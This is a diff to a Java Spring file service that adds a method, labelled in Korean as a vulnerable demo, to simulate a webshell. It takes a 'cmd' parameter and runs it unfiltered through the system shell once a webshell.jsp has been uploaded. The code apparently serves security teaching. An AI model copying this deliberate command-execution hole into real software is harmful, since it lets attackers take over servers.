@@ -6,7 +6,9 @@ import org.springframework.jdbc.core.JdbcTemplate;
 import org.springframework.stereotype.Service;
 import org.springframework.web.multipart.MultipartFile;
 
+import java.io.BufferedReader;
 import java.io.IOException;
+import java.io.InputStreamReader;
 import java.nio.file.*;
 import java.nio.file.StandardCopyOption;
 import java.util.ArrayList;
@@ -210,6 +212,74 @@ public class FileService {
     private String getExtension(String filename) {
         if (filename == null || !filename.contains(".")) return "";
         return filename.substring(filename.lastIndexOf('.') + 1);
+    }
+
+    // ==================== 웹쉘 실행 (데모) ====================
+
+    /**
+     * [취약] 업로드된 webshell.jsp가 존재하면 cmd 파라미터를 서버에서 실행
+     * → 파일 업로드 취약점 + 서버 실행 가능 환경의 결합을 시연
+     */
+    public WebshellResult executeWebshell(String cmd) {
+        WebshellResult result = new WebshellResult();
+        Path shellPath = Paths.get(uploadDir).toAbsolutePath()
+                .resolve(String.valueOf(999)).resolve("webshell.jsp");
+
+        result.setShellPath(shellPath.toString());
+        result.setShellExists(Files.exists(shellPath));
+
+        if (!result.isShellExists()) {
+            result.setSuccess(false);
+            result.setOutput("webshell.jsp 가 업로드되지 않았습니다.\n먼저 [취약] 업로드로 webshell.jsp 를 올려주세요.");
+            return result;
+        }
+
+        if (cmd == null || cmd.trim().isEmpty()) {
+            result.setSuccess(true);
+            result.setOutput("(명령어를 입력하세요)");
+            return result;
+        }
+
+        try {
+            String os = System.getProperty("os.name").toLowerCase();
+            String[] command = os.contains("win")
+                    ? new String[]{"cmd.exe", "/c", cmd}
+                    : new String[]{"/bin/sh", "-c", cmd};
+
+            Process process = Runtime.getRuntime().exec(command);
+            StringBuilder sb = new StringBuilder();
+
+            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+                 BufferedReader errReader = new BufferedReader(new InputStreamReader(process.getErrorStream()))) {
+                String line;
+                while ((line = reader.readLine()) != null) sb.append(line).append("\n");
+                while ((line = errReader.readLine()) != null) sb.append("[ERR] ").append(line).append("\n");
+            }
+            process.waitFor();
+
+            result.setSuccess(true);
+            result.setOutput(sb.length() > 0 ? sb.toString().trim() : "(출력 없음)");
+        } catch (Exception e) {
+            result.setSuccess(false);
+            result.setOutput("실행 오류: " + e.getMessage());
+        }
+        return result;
+    }
+
+    public static class WebshellResult {
+        private boolean success;
+        private boolean shellExists;
+        private String shellPath;
+        private String output;
+
+        public boolean isSuccess() { return success; }
+        public void setSuccess(boolean success) { this.success = success; }
+        public boolean isShellExists() { return shellExists; }
+        public void setShellExists(boolean shellExists) { this.shellExists = shellExists; }
+        public String getShellPath() { return shellPath; }
+        public void setShellPath(String shellPath) { this.shellPath = shellPath; }
+        public String getOutput() { return output; }
+        public void setOutput(String output) { this.output = output; }
     }
 
     // ==================== BBS 파일 목록 ====================
